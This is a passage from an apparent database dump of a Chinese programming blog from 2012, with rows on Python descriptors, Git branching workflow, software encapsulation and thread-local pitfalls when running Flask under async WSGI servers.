<span class="nc">Spam</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="n">my</span> <span class="o">=</span> <span class="n">my_descriptor</span>\n\n<span class="n">spam</span> <span class="o">=</span> <span class="n">Spam</span><span class="p">()</span>\n</pre></div>\n</figure><p>吧 MyDescriptor 的实例作为 Spam 一个名为 <tt class="docutils literal">my</tt> 的类属性之后，Spam 类中属性 <tt class="docutils literal">my</tt> 的访问就被重载了。 <tt class="docutils literal">Spam.my</tt> , <tt class="docutils literal">spam.my</tt> 和 <tt class="docutils literal">spam.my = 123</tt> 都不再直接在 <tt class="docutils literal">spam.__dict__</tt> 上获取和添加值，而是调用 <tt class="docutils literal">my_descriptor.__get__(None, Spam)</tt> , <tt class="docutils literal">my_descriptor.__get__(spam, Spam)</tt> 和 <tt class="docutils literal">my_descriptor.__set__(spam, 123)</tt> 。如果 <tt class="docutils literal">MyDescriptor</tt> 实现了 <tt class="docutils literal">__delete__</tt> ，那么 <tt class="docutils literal">del spam.my</tt> 也会被重载为 <tt class="docutils literal">my_descriptor.__delete__(spam)</tt> 。</p>\n<p>所以我理解为对应“元类”(meta-class)，描述符事实上是实现了“元属性”(meta-attribute)。通过这种重载方式，可以定义许多具有特殊行为的对象属性规格，而 Python 许多内置的对象模型成员也是通过这种方式实现的。</p>\n</div>\n<div class="section" id="id2">\n<h2>高层#0 - 从“函数”到“方法”</h2>\n<p>描述符在 Python 对象模型中的一个重要作用是实现“对象方法”(method)。我们都知道 Python 中方法有这些特性：</p>\n<ul class="simple">\n<li>方法本身是一个至少要有一个参数的普通函数，第 0 个参数位 self 指向实例，类似于 C++ 的 <tt class="docutils literal">const T* this</tt> 指针。</li>\n<li>作为方法的函数在类的命名空间还是以普通函数的形式存在的，比如 <tt class="docutils literal">Spam</tt> 类中的 <tt class="docutils literal">egg</tt> 方法的原始形态是 <tt class="docutils literal"><span class="pre">Spam.__dict__[''egg'']</span></tt> 这个函数。</li>\n<li>通过实例访问这个函数时，也就是类似 <tt class="docutils literal"><span class="pre">Spam().egg</span></tt> 的方式，得到的不再是 <tt class="docutils literal"><span class="pre">Spam.__dict__[''egg'']</span></tt> 中保存的那个原始函数，而是一个包装过的 &quot;bound method&quot;。这个对象仍然有 <tt class="docutils literal">__call__</tt> 可以调用，但相比它所包装的原函数，这个对象接受调用时参数列表已经少了一个参数。这是一种类似 <tt class="docutils literal">functools.partial(raw_function, self)</tt> 的效果，原函数已经被做了偏函数化处理，默认绑定了实例对象到第 0 个参数位(通常 self 所在的位置);</li>\n<li>奇怪的是，如果自己定义一个实现了 <tt class="docutils literal">__call__</tt> 的函数对象，把它放到类属性中，它并不会表现出“绑定 self”的特性。</li>\n</ul>\n<p>我此前一直对此很疑惑，以为这是一个语法级别的行为。直到看了 Flask、Jinja 2 的作者 Armin Ronacher 的 <a class="reference external" href="https://speakerdeck.com/u/mitsuhiko/p/basket-of-random-python-snippets">一个 Presentation</a> 我才知道，原来 Method 根本不是语法级别特性，而是通过描述符来实现的。</p>\n<p>我此前一直忽略了的是：一个 <tt class="docutils literal">def</tt> 定义的 Python 函数或一个 lambda 表达式，除了拥有 <tt class="docutils literal">__call__</tt> 实现外，还拥有 <tt class="docutils literal">__get__</tt> 实现。也就是说，所有 Python 函数都默认是一个描述符。这个描述符的特性在“类”这一对象上下文之外没有任何意义，但只要到了类中，就会和其他描述符所表现的一样，将 <tt class="docutils literal">my_instance.my_method</tt> 重载为 <tt class="docutils literal"><span class="pre">MyClass.__dict__[''my_method''].__get__(my_instance,</span> MyClass)</tt> 。“绑定 self 参数” 这个过程正是 <tt class="docutils literal">__get__</tt> 的行为，导致了 <tt class="docutils literal">spam.egg(1, 2, 3)</tt> 和 <tt class="docutils literal">Spam.egg(spam, 1, 2, 3)</tt> 等价。</p>\n<p>明白了这一点，我的思路就清晰多了。“方法”不就是一种特殊的类属性吗，而定义特殊类属性的行为在 Python 对象模型中的实现正是描述符。而对这点的理解也非常有用，Armin Ronacher 的演示稿中提到了可以利用这一点实现只对对象方法有效的装饰器。</p>\n</div>\n<div class="section" id="property">\n<h2>高层#1 - Property 属性</h2>\n<p>不明白为啥属性这个词有 Property 和 Attribute 两种翻译，但是在 Python 中二者是有区别的。后者指的是真正的对象属性，就是保存在 <tt class="docutils literal">obj.__dict__</tt> 中的成员（我一般更喜欢用 <tt class="docutils literal">vars(obj)</tt> 来取这个字典）；而前者指的是类似 C# 中“方法属性”或 Java 中 Getter、Setter 方法的重载属性。</p>\n<figure class="code"><div class="highlight"><pre><span class="k">class</span> <span class="nc">Spam</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n\n    <span class="nd">@property</span>\n    <span class="k">def</span> <span class="nf">egg</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="k">return</span> <span class="s">&quot;some-value&quot;</span>\n\n    <span class="nd">@egg.setter</span>\n    <span class="k">def</span> <span class="nf">egg</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>\n        <span class="bp">self</span><span class="o">.</span><span class="n">_egg</span> <span class="o">=</span> <span class="s">&quot;value = </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">value</span>\n\n<span class="n">spam</span> <span class="o">=</span> <span class="n">Spam</span><span class="p">()</span>\n</pre></div>\n</figure><p>说起来也很清晰，就是 <tt class="docutils literal">spam.egg</tt> 返回的是第一个 egg 方法调用的返回值， <tt class="docutils literal">spam.egg = &quot;abc&quot;</tt> 调用的是对于第二个 egg 方法的 <tt class="docutils literal">egg(self=spam, <span class="pre">value=&quot;abc&quot;)</span></tt> 。此外还可以继续定义删除属性操作的重载。这个比对象方法要容易看出来得多， <tt class="docutils literal">property</tt> 正是一个描述符。</p>\n</div>\n<div class="section" id="n">\n<h2>高层#n - 不受限制的用户自定义描述符</h2>\n<p>除去语言内置的这些描述符用法，还有许多用户自定义的描述符用法。这些用法让开发者可以更加灵活地扩展对象行为，是非常有用的元编程工具。相比起元类对整个类行为的重载，描述符的重载粒度非常细，它只关注一个属性。所以使用上我们也可以比使用元类减少更多的顾忌，因为我们能非常容易看到它能量释放的边界。</p>\n<p>用户定义描述符的例子，我觉得最经典的要属 SQLAlchemy （当然，Django Model 定义也是同理）。SQLAlchemy 的 <tt class="docutils literal">Column</tt> 类就是描述符的实现者。定义一个模型对象的时候，以声明风格写出这个模型对应的数据表所拥有的属性：</p>\n<figure class="code"><div class="highlight"><pre><span class="k">class</span> <span class="nc">User</span><span class="p">(</span><span class="n">Jsonizable</span><span class="p">,</span> <span class="n">LowerIdMixin</span><span class="p">,</span> <span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>\n    <span class="sd">&quot;&quot;&quot;The account of the user.&quot;&quot;&quot;</span>\n\n    <span class="n">email</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">64</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>\n    <span class="n">nickname</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Unicode</span><span class="p">(</span><span class="mi">20</span><span class="p">))</span>\n</pre></div>\n</figure><p>而 <tt class="docutils literal">email</tt> 、 <tt class="docutils literal">nickname</tt> 描述符将托管今后所有 <tt class="docutils literal">User</tt> 的实例中，对于这两个同名属性的访问。SQLAlchemy 在映射对象关系的时候，可以用这个特性实现许多特性，比如延迟加载——直到访问 <tt class="docutils literal">user.roles</tt> 的时候才执行 SQL 语句查询 <tt class="docutils literal">role</tt> 表并构造 <tt class="docutils literal">Role</tt> 对象集返回。</p>\n</div>', '2014-11-06 23:43:08', 6, '2012-08-04 19:14:00', '2012-08-04 19:14:00', 0, '[["__", 0.49108159190346595], ["\\u63cf\\u8ff0\\u7b26", 0.27752593577920415], ["my", 0.2762333954456996], ["Spam", 0.23019449620474966], ["egg", 0.23019449620474966], ["spam", 0.21484819645776634], ["self", 0.19950189671078306], ["\\u5c5e\\u6027", 0.1637168243857253], [".__", 0.1534629974698331], ["Python", 0.1534629974698331], ["\\u5bf9\\u8c61", 0.13630523508323492], ["descriptor", 0.12277039797586649], ["get", 0.10742409822888317], ["value", 0.10742409822888317], ["class", 0.10742409822888317], ["\\u91cd\\u8f7d", 0.10684641941463414], ["\\u51fd\\u6570", 0.10002998650215661], ["\\u65b9\\u6cd5", 0.09565734974403081], ["\\u5b9e\\u4f8b", 0.0934188098304493], ["MyDescriptor", 0.09207779848189987]]', NULL, NULL, 'Python 引入的“描述符”(descriptor)语法特性真的很黄很暴力，我觉得这算是 Python 对象模型的核心成员之一。Python 语言设计的紧凑很大程度上得益于它。所以写一篇笔记文记录关于描述符我知道的一切。\n\n\n低层 - 纯纯的描述符\n纯纯的描述符很纯，基于类中定义的 __get__ 、 __set__ 、 __delete__ 三个特殊的方法。实现了这三个中方法的任意一个，这个类的实例就拥有了一些特殊特性。\n假设现在有这么一个类 MyDescriptor，它拥有描述符的实现。把 MyDescriptor 实例化(my_descriptor)，然后将实例作为另一个类 Spam 的类属性。\nclass MyDescriptor(object):\n    def __get__(self, subject_instance, subject_class):\n        return (self, subject_instance, subject_class)\n\n    def __set__(self, subject_instance, value):\n        print "%r %r %r" (self, subject_instance, value)\n\nmy_descriptor = MyDescriptor()\n\nclass Spam(object):\n    my = my_descriptor\n\nspam = Spam()\n\n吧 MyDescriptor 的实例作为 Spam 一个名为 my 的类属性之后，Spam 类中属性 my 的访问就被重载了。 Spam.my , spam.my 和 spam.my = 123 都不再直接在 spam.__dict__ 上获取和添加值，而是调用 my_descriptor.__get__(None, Spam) , my_descriptor.__get__(spam, Spam) 和 my_descriptor.__set__(spam, 123) 。如果 MyDescriptor 实现了 __delete__ ，那么 del spam.my 也会被重载为 my_descriptor.__delete__(spam) 。\n所以我理解为对应“元类”(meta-class)，描述符事实上是实现了“元属性”(meta-attribute)。通过这种重载方式，可以定义许多具有特殊行为的对象属性规格，而 Python 许多内置的对象模型成员也是通过这种方式实现的。\n\n\n高层#0 - 从“函数”到“方法”\n描述符在 Python 对象模型中的一个重要作用是实现“对象方法”(method)。我们都知道 Python 中方法有这些特性：\n\n方法本身是一个至少要有一个参数的普通函数，第 0 个参数位 self 指向实例，类似于 C++ 的 const T* this 指针。\n作为方法的函数在类的命名空间还是以普通函数的形式存在的，比如 Spam 类中的 egg 方法的原始形态是 Spam.__dict__[''egg''] 这个函数。\n通过实例访问这个函数时，也就是类似 Spam().egg 的方式，得到的不再是 Spam.__dict__[''egg''] 中保存的那个原始函数，而是一个包装过的 "bound method"。这个对象仍然有 __call__ 可以调用，但相比它所包装的原函数，这个对象接受调用时参数列表已经少了一个参数。这是一种类似 functools.partial(raw_function, self) 的效果，原函数已经被做了偏函数化处理，默认绑定了实例对象到第 0 个参数位(通常 self 所在的位置);\n奇怪的是，如果自己定义一个实现了 __call__ 的函数对象，把它放到类属性中，它并不会表现出“绑定 self”的特性。\n\n我此前一直对此很疑惑，以为这是一个语法级别的行为。直到看了 Flask、Jinja 2 的作者 Armin Ronacher 的 一个 Presentation 我才知道，原来 Method 根本不是语法级别特性，而是通过描述符来实现的。\n我此前一直忽略了的是：一个 def 定义的 Python 函数或一个 lambda 表达式，除了拥有 __call__ 实现外，还拥有 __get__ 实现。也就是说，所有 Python 函数都默认是一个描述符。这个描述符的特性在“类”这一对象上下文之外没有任何意义，但只要到了类中，就会和其他描述符所表现的一样，将 my_instance.my_method 重载为 MyClass.__dict__[''my_method''].__get__(my_instance, MyClass) 。“绑定 self 参数” 这个过程正是 __get__ 的行为，导致了 spam.egg(1, 2, 3) 和 Spam.egg(spam, 1, 2, 3) 等价。\n明白了这一点，我的思路就清晰多了。“方法”不就是一种特殊的类属性吗，而定义特殊类属性的行为在 Python 对象模型中的实现正是描述符。而对这点的理解也非常有用，Armin Ronacher 的演示稿中提到了可以利用这一点实现只对对象方法有效的装饰器。\n\n\n高层#1 - Property 属性\n不明白为啥属性这个词有 Property 和 Attribute 两种翻译，但是在 Python 中二者是有区别的。后者指的是真正的对象属性，就是保存在 obj.__dict__ 中的成员（我一般更喜欢用 vars(obj) 来取这个字典）；而前者指的是类似 C# 中“方法属性”或 Java 中 Getter、Setter 方法的重载属性。\nclass Spam(object):\n\n    @property\n    def egg(self):\n        return "some-value"\n\n    @egg.setter\n    def egg(self, value):\n        self._egg = "value = %s" % value\n\nspam = Spam()\n\n说起来也很清晰，就是 spam.egg 返回的是第一个 egg 方法调用的返回值， spam.egg = "abc" 调用的是对于第二个 egg 方法的 egg(self=spam, value="abc") 。此外还可以继续定义删除属性操作的重载。这个比对象方法要容易看出来得多， property 正是一个描述符。\n\n\n高层#n - 不受限制的用户自定义描述符\n除去语言内置的这些描述符用法，还有许多用户自定义的描述符用法。这些用法让开发者可以更加灵活地扩展对象行为，是非常有用的元编程工具。相比起元类对整个类行为的重载，描述符的重载粒度非常细，它只关注一个属性。所以使用上我们也可以比使用元类减少更多的顾忌，因为我们能非常容易看到它能量释放的边界。\n用户定义描述符的例子，我觉得最经典的要属 SQLAlchemy （当然，Django Model 定义也是同理）。SQLAlchemy 的 Column 类就是描述符的实现者。定义一个模型对象的时候，以声明风格写出这个模型对应的数据表所拥有的属性：\nclass User(Jsonizable, LowerIdMixin, db.Model):\n    """The account of the user."""\n\n    email = db.Column(db.String(64), unique=True, nullable=False)\n    nickname = db.Column(db.Unicode(20))\n\n而 email 、 nickname 描述符将托管今后所有 User 的实例中，对于这两个同名属性的访问。SQLAlchemy 在映射对象关系的时候，可以用这个特性实现许多特性，比如延迟加载——直到访问 user.roles 的时候才执行 SQL 语句查询 role 表并构造 Role 对象集返回。\n', NULL, NULL, NULL),
(79, 'https://blog.tonyseek.com/post/jottings-about-git-flow/', '关于 Git 工作流的随笔', '<p>关于 Git 工作流，我之前只知道有个 Git Flow。工具我没有用过，不过思路我很赞同。类似 Git 这样的分布式版本控制，不再强调代码在提交时的整合，而是强调中心库向私有库的分裂和各个私有库各自的合并。分支越细致，合并代码的成本就越低。以 Feature、Bugfix 为单位整理分支，合并的时候就会非常清晰。如果代码耦合度低的话，几乎所有合并都可以自动完成。</p>\n<p>这次在学校和同学一起开了一个 Web 项目，代码用 Git 来管理。参与的同学之前只用过 SVN，对 Git 也是初次接触。我考虑要不要尝试一下 Git Flow 这个工具，所以在豆瓣发了一条广播，结果几位同学回复让我看到更多类似 Git Flow 的工具或者思路，所以写篇文章记录下。本文纯属记录，没有主题。</p>\n\n<div class="section" id="id1">\n<h2>Git 实践</h2>\n<div class="section" id="id2">\n<h3>主干分支永远可用</h3>\n<blockquote>\nThe master branch should be deployable in anytime.</blockquote>\n<p>我看到 GitHub 上非常多项目都遵守这一做法。我不清楚这么做的其他好处，只是将其理解为一种共同的约定——从任何一个遵守这一约定的仓库 checkout 出代码，master 分支一定不是在开发了一半的“施工中”状态。这一点在非分布式版本控制中也可以看到。清风老师在 BPUG 的一次会课提到过，豆瓣的主站代码用 SVN 托管，所有开发者都把 <tt class="docutils literal">trunk</tt> 复制到一个以自己名字命名的分支下（我觉得这很类似于 GitHub 的 Fork），开发者完成开发后再合并到 <tt class="docutils literal">trunk</tt> 。这样 <tt class="docutils literal">trunk</tt> 的代码也是可用的。其他人需要开新的分支时，可以方向地从 <tt class="docutils literal">trunk</tt> 或者 <tt class="docutils literal">master</tt> 开始创建；类似 <tt class="docutils literal">rebase</tt> 这样的动作，也可以很方向地把目标瞄准 <tt class="docutils literal">master</tt> 。</p>\n<p>在 Git Flow 的方式中，有个 <tt class="docutils literal">release</tt> 分支保存发行的点。我觉得这个可以用 <tt class="docutils literal">master</tt> 分支来替代，而且这个很适合用 <tt class="docutils literal">master</tt> 分支来替代，因为这样可以确保我们不把没打上发行 Tag 的提交合并到 <tt class="docutils literal">master</tt> 。</p>\n</div>\n<div class="section" id="id3">\n<h3>细粒度分支</h3>\n<blockquote>\n“尽情开分支,切分支,rebase merge 效率比SVN高出很多”</blockquote>\n<p>这句是巨句同学说的。我在阅读《Pro Git》的时候书上也提到过，Git 鼓励多用细粒度分支，对此也做了高度优化。</p>\n<p>我此前用 Git 有两种用法，一种是确定从头到尾只有我一个人开发的时候，我会只使用 <tt class="docutils literal">master</tt> ，然后一条直线提交到最后。但是来实习之后，我写的第一份代码就改变了这种用法。因为之前的一些开发工作我发现，即使只有一个人开发，也难免会遇到需要 branch 的时候。</p>\n<p>比如已经发行了 0.1 版本，正在为 0.2 版本开发一个 feature 的时候，我突然遇到 0.1 版本的一个 bug。为了修复这个 bug，无论是写 hotfix 还是发行 0.1.1 版本，都是会打断当前工作的。如果我使用分支来完成这个工作，我可以从 master 中打 0.1 tag 的地方开始创建一个 hotfix 分支。</p>\n<p>对比起来，git 的 branch 和 SVN 或 HG 的分支含义不同，前者的分支是一种类似平行空间的概念。目录、文件还是原来的目录、文件，但是它停留在历史上的某个点了。如果继续发展下去，不同的分支也会走不同的路线，就像两个完全独立的版本仓库。所以从 0.1 的 hotfix 到 0.1.1 的发行，对 0.2 可以不造成任何干扰。</p>\n</div>\n<div class="section" id="id4">\n<h3>关于工具</h3>\n<p>Git Flow 这类工具似乎是想在工作流的层面上屏蔽 Git 操作的底层细节，其实我个人不是很赞同这样做。我觉得版本控制是一件比项目管理更加细致的事情，它可以细致到每一行源代码。现有的 Git 操作让我觉得粒度刚好合适，既不繁琐，又清晰明了。如果我需要开启一个 Feature，我可以非常清晰地完成每个步骤：</p>\n<figure class="code"><div class="highlight"><pre><span class="nv">$ </span>git branch feature/lookup\n<span class="nv">$ </span>git checkout feature/lookup\n<span class="nv">$ </span>git add my-changed-file\n<span class="nv">$ </span>git commit -m <span class="s2">&quot;#15: Finished to develop this feature.&quot;</span>\n<span class="nv">$ </span>git checkout develop\n<span class="nv">$ </span>git merge feature/lookup\n</pre></div>\n</figure><p>但是如果上述步骤全部变成了</p>\n<figure class="code"><div class="highlight"><pre><span class="nv">$ </span>git flow feature start lookup\n<span class="nv">$ </span>git flow feature finish lookup\n<span class="nv">$ </span>git flow feature publish lookup\n</pre></div>\n</figure><p>我会觉得很没有安全感。如果一切都在预期之内，那么这类工具能方便工作。但是如果发生某些异常情况呢？我可能连 Git Flow 做了什么都不知道，不像 Raw Git 时候我会清晰地记得自己刚刚执行了 <tt class="docutils literal">git merge</tt> 。</p>\n<p>现在的关键问题是，对于这个问题我没有什么发言权，因为我自己没有真正用过 Git Flow 或者其他类似工具。所以希望用过的同学如果有想吐槽的能吐出来…… 讲解 Git Flow 便捷的文章能看到很多，但是貌似和官网的说法没有大的区别。我个人还是更期待吐槽文。</p>\n<p>其实我也可以就试用一下，我想尝试下新鲜事物总是好的，最坏的结果是又挖一个坑罢了。从 IDE 使用者到 Sublime Text 使用者再到最近刚刚上手 Vim 并感叹 Vim 的强大，期间也不经意尝试了很多新鲜事物。</p>\n<p>另外 xx 同学推荐了两款类似的 GitHub 工作流解决方案，这里也记录一下：GitHub Flow 和 legit。</p>\n</div>\n</div>', '2014-11-06 23:43:08', 6, '2012-08-04 18:31:00', '2012-08-04 18:31:00', 0, '[["Git", 0.36635577831467736], ["git", 0.21210071376112902], ["\\u5206\\u652f", 0.20281780913980646], ["master", 0.1735369476227419], ["Flow", 0.1735369476227419], ["feature", 0.15425506455354837], ["0.1", 0.11569129841516128], ["lookup", 0.11569129841516128], ["\\u4ee3\\u7801", 0.09257347418864516], ["branch", 0.07712753227677419], ["trunk", 0.07712753227677419], ["GitHub", 0.07712753227677419], ["SVN", 0.07712753227677419], ["\\u540c\\u5b66", 0.06973660251725806], ["\\u5de5\\u5177", 0.06906802491851613], ["\\u7c7b\\u4f3c", 0.06745738926883871], ["\\u5408\\u5e76", 0.0639450965051613], ["\\u7248\\u672c\\u63a7\\u5236", 0.06390740550677419], ["\\u53ef\\u4ee5", 0.06218759963509678], ["\\u7248\\u672c", 0.06114281885669355]]', NULL, NULL, '关于 Git 工作流，我之前只知道有个 Git Flow。工具我没有用过，不过思路我很赞同。类似 Git 这样的分布式版本控制，不再强调代码在提交时的整合，而是强调中心库向私有库的分裂和各个私有库各自的合并。分支越细致，合并代码的成本就越低。以 Feature、Bugfix 为单位整理分支，合并的时候就会非常清晰。如果代码耦合度低的话，几乎所有合并都可以自动完成。\n这次在学校和同学一起开了一个 Web 项目，代码用 Git 来管理。参与的同学之前只用过 SVN，对 Git 也是初次接触。我考虑要不要尝试一下 Git Flow 这个工具，所以在豆瓣发了一条广播，结果几位同学回复让我看到更多类似 Git Flow 的工具或者思路，所以写篇文章记录下。本文纯属记录，没有主题。\n\n\nGit 实践\n\n主干分支永远可用\n\nThe master branch should be deployable in anytime.\n我看到 GitHub 上非常多项目都遵守这一做法。我不清楚这么做的其他好处，只是将其理解为一种共同的约定——从任何一个遵守这一约定的仓库 checkout 出代码，master 分支一定不是在开发了一半的“施工中”状态。这一点在非分布式版本控制中也可以看到。清风老师在 BPUG 的一次会课提到过，豆瓣的主站代码用 SVN 托管，所有开发者都把 trunk 复制到一个以自己名字命名的分支下（我觉得这很类似于 GitHub 的 Fork），开发者完成开发后再合并到 trunk 。这样 trunk 的代码也是可用的。其他人需要开新的分支时，可以方向地从 trunk 或者 master 开始创建；类似 rebase 这样的动作，也可以很方向地把目标瞄准 master 。\n在 Git Flow 的方式中，有个 release 分支保存发行的点。我觉得这个可以用 master 分支来替代，而且这个很适合用 master 分支来替代，因为这样可以确保我们不把没打上发行 Tag 的提交合并到 master 。\n\n\n细粒度分支\n\n“尽情开分支,切分支,rebase merge 效率比SVN高出很多”\n这句是巨句同学说的。我在阅读《Pro Git》的时候书上也提到过，Git 鼓励多用细粒度分支，对此也做了高度优化。\n我此前用 Git 有两种用法，一种是确定从头到尾只有我一个人开发的时候，我会只使用 master ，然后一条直线提交到最后。但是来实习之后，我写的第一份代码就改变了这种用法。因为之前的一些开发工作我发现，即使只有一个人开发，也难免会遇到需要 branch 的时候。\n比如已经发行了 0.1 版本，正在为 0.2 版本开发一个 feature 的时候，我突然遇到 0.1 版本的一个 bug。为了修复这个 bug，无论是写 hotfix 还是发行 0.1.1 版本，都是会打断当前工作的。如果我使用分支来完成这个工作，我可以从 master 中打 0.1 tag 的地方开始创建一个 hotfix 分支。\n对比起来，git 的 branch 和 SVN 或 HG 的分支含义不同，前者的分支是一种类似平行空间的概念。目录、文件还是原来的目录、文件，但是它停留在历史上的某个点了。如果继续发展下去，不同的分支也会走不同的路线，就像两个完全独立的版本仓库。所以从 0.1 的 hotfix 到 0.1.1 的发行，对 0.2 可以不造成任何干扰。\n\n\n关于工具\nGit Flow 这类工具似乎是想在工作流的层面上屏蔽 Git 操作的底层细节，其实我个人不是很赞同这样做。我觉得版本控制是一件比项目管理更加细致的事情，它可以细致到每一行源代码。现有的 Git 操作让我觉得粒度刚好合适，既不繁琐，又清晰明了。如果我需要开启一个 Feature，我可以非常清晰地完成每个步骤：\n$ git branch feature/lookup\n$ git checkout feature/lookup\n$ git add my-changed-file\n$ git commit -m "#15: Finished to develop this feature."\n$ git checkout develop\n$ git merge feature/lookup\n\n但是如果上述步骤全部变成了\n$ git flow feature start lookup\n$ git flow feature finish lookup\n$ git flow feature publish lookup\n\n我会觉得很没有安全感。如果一切都在预期之内，那么这类工具能方便工作。但是如果发生某些异常情况呢？我可能连 Git Flow 做了什么都不知道，不像 Raw Git 时候我会清晰地记得自己刚刚执行了 git merge 。\n现在的关键问题是，对于这个问题我没有什么发言权，因为我自己没有真正用过 Git Flow 或者其他类似工具。所以希望用过的同学如果有想吐槽的能吐出来…… 讲解 Git Flow 便捷的文章能看到很多，但是貌似和官网的说法没有大的区别。我个人还是更期待吐槽文。\n其实我也可以就试用一下，我想尝试下新鲜事物总是好的，最坏的结果是又挖一个坑罢了。从 IDE 使用者到 Sublime Text 使用者再到最近刚刚上手 Vim 并感叹 Vim 的强大，期间也不经意尝试了很多新鲜事物。\n另外 xx 同学推荐了两款类似的 GitHub 工作流解决方案，这里也记录一下：GitHub Flow 和 legit。\n\n', NULL, NULL, NULL),
(80, 'https://blog.tonyseek.com/post/a-door-of-798/', '青旅门外', '<a class="reference external image-reference" href="https://instagram.com/p/NDgo-cvUFq/"><img alt="青旅门外 (使用 Instagram 拍摄)" src="https://instagram.com/p/NDgo-cvUFq/media?size=l" /></a>', '2014-11-06 23:43:08', 6, '2012-07-14 08:38:00', '2012-07-14 08:38:00', 0, '[]', NULL, NULL, '', NULL, NULL, NULL),
(81, 'https://blog.tonyseek.com/post/what-is-wrapping/', '胡思乱想：封装到底是什么', '<p>最近比较忙，奇怪的是越忙的时候就越会有一些很无聊的胡思乱想。想到了一个初学面向对象时被问到烂了的问题：封装到底是什么。这个问题课本有标准答案式的解答，什么隐藏内部实现保留外部接口，但我并不满意这个回答。今天上课的时候又被老师的关联话题提起，于是想记录一下我现在的想法。</p>\n\n<div class="section" id="id2">\n<h2>理想状况下的封装</h2>\n<p>我认为对于有一定复杂度的软件或中间件，理想状况下的封装应该是其内部单元的投影（或视图）。也就是说，良好的封装并不是为了隐藏内部细节，而且强调某种情况下我们仅仅需要关注的部分单元。在脱离了这种情况之后，我们应该随时有放开投影观其全貌的权利。</p>\n<p><img alt="软件内部单元的投影" src="https://20.media.tumblr.com/tumblr_m58800KUpb1qheous.png" /></p>\n</div>\n<div class="section" id="id3">\n<h2>比较常见的封装</h2>\n<p>隐藏和掩盖丑陋的内部设计。</p>\n</div>', '2014-11-06 23:43:08', 6, '2012-06-07 02:55:00', '2012-06-07 02:55:00', 0, '[["\\u5c01\\u88c5", 0.506973876815], ["\\u9690\\u85cf", 0.2310050543379], ["\\u5185\\u90e8", 0.2255247471588], ["\\u6295\\u5f71", 0.18294174921740003], ["\\u5355\\u5143", 0.1541254452174], ["\\u8d8a\\u5fd9", 0.132075304714], ["\\u7406\\u60f3", 0.1315237534526], ["\\u89c6\\u56fe", 0.128020653633], ["\\u4e2d\\u95f4\\u4ef6", 0.122912397395], ["\\u8d8a\\u4f1a", 0.11954767502899999], ["\\u89c2\\u5176", 0.11954767502899999], ["\\u590d\\u6742\\u5ea6", 0.11954767502899999], ["\\u6bd4\\u8f83\\u5fd9", 0.11954767502899999], ["\\u72b6\\u51b5", 0.1174966861564], ["\\u6807\\u51c6\\u7b54\\u6848", 0.10809635198600001], ["\\u9762\\u5411\\u5bf9\\u8c61", 0.10642581114], ["\\u521d\\u5b66", 0.0989334446674], ["\\u5168\\u8c8c", 0.0975754292558], ["\\u5e94\\u8be5", 0.0936811408408], ["\\u8bfe\\u672c", 0.0933632946051]]', NULL, NULL, '最近比较忙，奇怪的是越忙的时候就越会有一些很无聊的胡思乱想。想到了一个初学面向对象时被问到烂了的问题：封装到底是什么。这个问题课本有标准答案式的解答，什么隐藏内部实现保留外部接口，但我并不满意这个回答。今天上课的时候又被老师的关联话题提起，于是想记录一下我现在的想法。\n\n\n理想状况下的封装\n我认为对于有一定复杂度的软件或中间件，理想状况下的封装应该是其内部单元的投影（或视图）。也就是说，良好的封装并不是为了隐藏内部细节，而且强调某种情况下我们仅仅需要关注的部分单元。在脱离了这种情况之后，我们应该随时有放开投影观其全貌的权利。\n\n\n\n比较常见的封装\n隐藏和掩盖丑陋的内部设计。\n', NULL, NULL, NULL),
(82, 'https://blog.tonyseek.com/post/be-careful-with-async-wsgi-server/', '慎用异步 WSGI Server 运行 Flask 应用', '<p>这个标题有点不太准确，其实应该说：慎用异步 WSGI Server 运行基于 <a class="reference external" href="http://werkzeug.pocoo.org/">Werkzeug</a> 的应用。或者更宽泛一点——慎用异步 WSGI Server 运行使用 Thread Local 的应用。 <a class="reference external" href="http://flask.pocoo.org/">Flask</a> 是基于 Werkzeug 的故也在此列。貌似使用 Werkzeug 作为底层 WSGI 库的框架还有国内 limodou 老师的 <a class="reference external" href="http://limodou.github.com/uliweb-doc/">Uliweb</a> 。而其他使用 Thread Local 的 WSGI Application 不计其数，Bottle、web.py 都在此列。但我没有测试过其他的，仅仅掉下过 Flask 的坑。</p>\n\n<p>这个坑问题就出在 Werkzeug 的 Thread Local 上。用过 Flask 的同学应该不会忘记其便捷的 <tt class="docutils literal">flask.request</tt> 、 <tt class="docutils literal">flask.g</tt> 、 <tt class="docutils literal">flask.session</tt> 等对象。引用的时候就像使用单例对象一样，但实际上对它们的所有赋值操作都只会影响到当前请求（当前线程）。Thread Local 模式的实现一定要有一个 Thread Identity 作为标识，由此产生的 Proxy 对象会根据这个标识创建多个独立的数据空间。我们访问代理对象的时候就像访问全局对象，但代理对象会将消息分发到 Thread Identity 对应的真实对象上。</p>\n<p>一般这个实现都会使用系统提供的当前线程 ID 作为 Thread Identity，于是在使用多线程的 Web 服务器上，由于每个请求独享一个线程，每个 Thread Local 的数据空间也就为一个请求所独享。这是 Flask（Werkzeug）可以正常工作的假设前提。但异步 WSGI Server 一般不会给每个请求分配一个线程。为了减少内核调度线程的开销，这类服务器软件一般使用协同式调度——若干个请求都在同一个进程的主线程中运行，遇到 IO 阻塞（例如等待网络）则挂起当前帧栈，切换到另一个帧栈执行，整个过程都是协同式的，并没有时间片轮转这些抢占的做法。如此一来，用线程 ID 作为 Thread Identity 的所有 Thread Local 对象就会退化成单例对象，这也是我遇到的灵异现象的原因：在宿舍登录网站，远在图书馆的电脑会同步登录。</p>\n<p>说到底还是 Thread Identity 选取导致的问题。其实 Werkzeug 在设计的时候有考虑到这个问题，其默认的 Thread Identity 工厂选取就优先采用 <a class="reference external" href="http://readthedocs.org/docs/greenlet/en/latest/">Greenlet</a> 的“当前协程 